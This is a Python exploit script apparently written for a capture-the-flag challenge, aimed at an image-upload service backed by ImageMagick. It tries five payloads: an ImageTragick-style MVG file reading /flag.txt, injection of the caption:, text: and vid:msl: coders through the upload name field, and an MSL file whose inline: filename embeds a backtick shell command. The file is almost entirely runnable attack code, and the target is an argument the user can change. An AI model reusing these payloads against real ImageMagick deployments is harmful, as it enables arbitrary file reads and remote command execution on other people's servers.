#!/usr/bin/env python3
import requests
import sys
import time

URL = "https://aa1fadfd635d-magik.challs.m0lecon.it" if len(sys.argv) < 2 else sys.argv[1]

def try_exploit_1():
    """
    Exploit using push/pop graphic-context (ImageTragick CVE-2016-3714 style)
    """
    print("[*] Trying ImageTragick push/pop exploit...")

    payload = '''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/flag.txt'
pop graphic-context'''

    files = {'img': ('exploit.mvg', payload, 'image/x-mvg')}
    data = {'name': 'imagetragick1'}

    try:
        r = requests.post(URL, files=files, data=data, timeout=10)
        print(f"[+] Upload: {r.status_code}")

        time.sleep(2)

        result = requests.get(f"{URL}/static/imagetragick1.png", timeout=5)
        if result.status_code == 200:
            print(f"[+] Got response, size: {len(result.content)}")
            with open("imagetragick1.png", "wb") as f:
                f.write(result.content)
            print("[+] Saved to imagetragick1.png")
            return True
    except Exception as e:
        print(f"[-] Failed: {e}")

    return False

def try_exploit_2():
    """
    Use text: protocol to read file and embed in image
    """
    print("\n[*] Trying text: protocol...")

    # Simple payload that should create a text image from file
    payload = b'GIF89a' + b'\x00' * 10  # Fake GIF header

    files = {'img': ('exploit.gif', payload, 'image/gif')}
    data = {'name': 'text:@/flag.txt'}  # Inject into output filename

    try:
        r = requests.post(URL, files=files, data=data, timeout=10)
        print(f"[+] Upload: {r.status_code}")

        time.sleep(1)

        # The file might be at text:@/flag.txt.png
        result = requests.get(f"{URL}/static/text:@/flag.txt.png", timeout=5)
        if result.status_code == 200:
            print(f"[!] Got result!")
            print(result.text)
            return True
    except Exception as e:
        print(f"[-] Failed: {e}")

    return False

def try_exploit_3():
    """
    Use inline: protocol with data
    """
    print("\n[*] Trying inline protocol with file read...")

    # Create MSL file that will be processed
    msl = '''<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="inline:data:,`/readflag > /app/static/pwned3.txt`" />
<write filename="/app/static/out3.png" />
</image>'''

    files = {'img': ('exploit.msl', msl, 'text/plain')}
    data = {'name': 'msl_test'}

    try:
        r = requests.post(URL, files=files, data=data, timeout=10)
        print(f"[+] Upload: {r.status_code}")

        time.sleep(2)

        # Check if we can read the flag
        result = requests.get(f"{URL}/static/pwned3.txt", timeout=5)
        if result.status_code == 200:
            print(f"[!] FLAG: {result.text}")
            return True

        # Also check the output file
        result2 = requests.get(f"{URL}/static/out3.png", timeout=5)
        if result2.status_code == 200:
            print(f"[+] Got output, size: {len(result2.content)}")

    except Exception as e:
        print(f"[-] Failed: {e}")

    return False

def try_exploit_4():
    """
    Exploit via caption: protocol to read flag
    """
    print("\n[*] Trying caption: protocol to read flag...")

    # Create a simple image that will trigger caption processing
    files = {'img': ('test.txt', b'test', 'text/plain')}
    data = {'name': 'caption:@/flag.txt'}

    try:
        r = requests.post(URL, files=files, data=data, timeout=10)
        print(f"[+] Upload: {r.status_code}")

        time.sleep(1)

        result = requests.get(f"{URL}/static/caption:@/flag.txt.png", timeout=5)
        if result.status_code == 200:
            print(f"[+] Got result, size: {len(result.content)}")
            with open("caption_result.png", "wb") as f:
                f.write(result.content)
            print("[+] Saved to caption_result.png - check this file!")
            return True
    except Exception as e:
        print(f"[-] Failed: {e}")

    return False

def try_exploit_5():
    """
    Use vid:msl: protocol to trigger MSL processing
    We need to first upload an MSL file, then reference it
    """
    print("\n[*] Trying vid:msl: protocol...")

    # First upload creates the MSL file
    msl = '''<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:@/flag.txt" />
<write filename="/app/static/flag_output.png" />
</image>'''

    files = {'img': ('payload.msl', msl, 'text/plain')}
    data = {'name': 'payload_step1'}

    try:
        r = requests.post(URL, files=files, data=data, timeout=10)
        print(f"[+] MSL upload: {r.status_code}")

        time.sleep(1)

        # Now trigger it by referencing via vid:msl:
        # The uploaded file is likely in /tmp/phpXXXXXX
        files2 = {'img': ('dummy.txt', b'x', 'text/plain')}
        data2 = {'name': 'vid:msl:/tmp/php*'}

        r2 = requests.post(URL, files=files2, data=data2, timeout=10)
        print(f"[+] Trigger upload: {r2.status_code}")

        time.sleep(2)

        # Check for the output
        result = requests.get(f"{URL}/static/flag_output.png", timeout=5)
        if result.status_code == 200:
            print(f"[+] Got result, size: {len(result.content)}")
            with open("flag_output.png", "wb") as f:
                f.write(result.content)
            print("[!] Saved to flag_output.png - check this file!")
            return True

    except Exception as e:
        print(f"[-] Failed: {e}")

    return False

if __name__ == "__main__":
    print(f"[*] Target: {URL}\n")

    exploits = [
        try_exploit_4,  # caption: is most likely to work
        try_exploit_1,  # ImageTragick
        try_exploit_5,  # MSL
        try_exploit_2,  # text:
        try_exploit_3,  # inline
    ]

    for exploit_func in exploits:
        if exploit_func():
            print(f"\n[+] {exploit_func.__name__} may have succeeded!")
            print("[*] Check the generated files for the flag")
        else:
            print(f"[-] {exploit_func.__name__} did not succeed")

    print("\n[*] Done. Check any PNG files that were downloaded.")
